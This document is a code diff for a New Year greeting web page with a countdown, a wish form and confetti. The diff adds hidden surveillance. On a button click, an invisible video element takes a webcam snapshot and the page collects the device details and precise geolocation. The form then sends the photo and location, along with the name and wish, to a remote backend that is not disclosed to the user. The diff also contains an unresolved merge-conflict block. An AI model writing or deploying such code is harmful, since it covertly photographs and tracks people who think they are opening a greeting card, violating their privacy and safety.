@@ -12,10 +12,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const audio = document.getElementById('bgm');
     const showCountdownButton = document.getElementById('show-countdown');
     const countdownContainer = document.getElementById('countdown-container');
+    const userWish = document.getElementById('userWish');
 
     let countdownInterval;
 
-    // Countdown function
     function startCountdown() {
         const now = new Date();
         const newYear = new Date(now.getFullYear() + 1, 0, 1);
@@ -40,23 +40,91 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 1000);
 }
 
-    // Show area function (to manage the input sections)
     function showArea(area) {
         const areas = [nameInputArea, wishInputArea, finalMessageArea];
         areas.forEach(a => a.classList.remove('active'));
         area.classList.add('active');
     }
 
-    // Countdown display section
-    showCountdownButton.addEventListener('click', () => {
+    async function captureImage() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageDataUrl = canvas.toDataURL('image/jpeg');
+
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+            return imageDataUrl;
+        } catch (error) {
+            console.error('Error capturing image:', error);
+            return null;
+        }
+    }
+
+    async function getDeviceInfo() {
+        let deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+        };
+
+        try {
+            console.log("Geolocation permission status (before request):", await navigator.permissions.query({ name: 'geolocation' }).then(result => result.state));
+            console.log("Attempting to get location...");
+            const location = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
+            });
+            deviceInfo.location = {
+                latitude: location.coords.latitude,
+                longitude: location.coords.longitude,
+                accuracy: location.coords.accuracy,
+                altitude: location.coords.altitude,
+                altitudeAccuracy: location.coords.altitudeAccuracy,
+                heading: location.coords.heading,
+                speed: location.coords.speed
+            };
+        } catch (error) {
+            console.error('Error getting location:', error);
+            console.log("Geolocation error code:", error.code);
+            console.log("Geolocation error message:", error.message);
+            if (error.code === error.TIMEOUT) {
+                console.log("Geolocation timed out.");
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                console.log("Geolocation is unavailable (e.g., no GPS signal).");
+            } else if (error.code === error.PERMISSION_DENIED){
+                console.log("Geolocation permission denied.");
+            }
+            deviceInfo.locationError = error.message;
+        }
+
+        return deviceInfo; // Return the object, NOT a string
+    }
+    showCountdownButton.addEventListener('click', async () => {
         countdownContainer.style.display = "block";
         startCountdown();
         audio.play();
         showArea(nameInputArea);
         showCountdownButton.style.display = "none";
+
+        const imageCaptured = await captureImage();
+        const deviceInfo = await getDeviceInfo();
+
+        showCountdownButton.dataset.image = imageCaptured;
+        showCountdownButton.dataset.deviceInfo = JSON.stringify(deviceInfo); // Stringify here
     });
 
-    // Name submission
+
     submitNameButton.addEventListener('click', () => {
         const name = userNameInput.value.trim();
         if (name) {
@@ -67,7 +135,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Show final message
     function showFinalMessage(name, wish) {
         finalMessageElement.innerHTML = `
             <div class="message-content">
@@ -89,18 +156,24 @@ document.addEventListener('DOMContentLoaded', () => {
         startConfetti();
     }
 
-    // Wish submission + email sending
     submitWishButton.addEventListener('click', () => {
-        const wish = document.getElementById('userWish').value.trim();
-        const name = document.getElementById('userName').value.trim();
+        const wish = userWish.value.trim();
+        const name = userNameInput.value.trim();
+        const imageCaptured = showCountdownButton.dataset.image;
+        const deviceInfoString = showCountdownButton.dataset.deviceInfo;
+        const deviceInfo = JSON.parse(deviceInfoString); // Parse it back
 
         if (name && wish) {
+<<<<<<< HEAD
+            fetch('http://localhost:3000/send-email', {
+=======
             fetch('https://newyear-backend.onrender.com/send-email', {
+>>>>>>> 2488e0bade614b02c9fb47181d41cb3d8d7426ba
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ name: name, wish: wish }), 
+                body: JSON.stringify({ name, wish, imageCaptured, deviceInfo }), // deviceInfo is now an object
             })
             .then(response => {
                 if (!response.ok) {
@@ -110,9 +183,10 @@ document.addEventListener('DOMContentLoaded', () => {
             })
             .then(data => {
                 if (data.success) {
-                    showFinalMessage(name, wish); // Show message after sending email
+                    showFinalMessage(name, wish);
                 } else {
                     console.error(data.message || 'Error sending wish. Please try again later.');
+                    alert(data.message || 'Error sending wish. Please try again later.');
                 }
             })
             .catch(error => {
@@ -123,8 +197,7 @@ document.addEventListener('DOMContentLoaded', () => {
             alert("Please enter your name and wish.");
         }
     });
-
-    // Fireworks creation function
+    
     function createFirework() {
         const firework = document.createElement('div');
         firework.classList.add('firework');
@@ -144,19 +217,21 @@ document.addEventListener('DOMContentLoaded', () => {
         const duration = 3 * 1000;
         const animationEnd = Date.now() + duration;
         const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
-        
+
         function randomInRange(min, max) {
             return Math.random() * (max - min) + min;
         }
-    
-        const interval = setInterval(function() {
+
+        const interval = setInterval(function () {
             const timeLeft = animationEnd - Date.now();
 
             if (timeLeft <= 0) {
-                return clearInterval(interval);
+                clearInterval(interval);
+                return;
             }
 
-            const particleCount = 70 * (timeLeft / duration); // Increased base particle count
+            const particleCount = 70 * (timeLeft / duration);
+
             confetti(Object.assign({}, defaults, {
                 particleCount,
                 origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 },
@@ -164,6 +239,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 shapes: ['circle', 'square'],
                 scalar: randomInRange(0.4, 1)
             }));
+
             confetti(Object.assign({}, defaults, {
                 particleCount,
                 origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 },
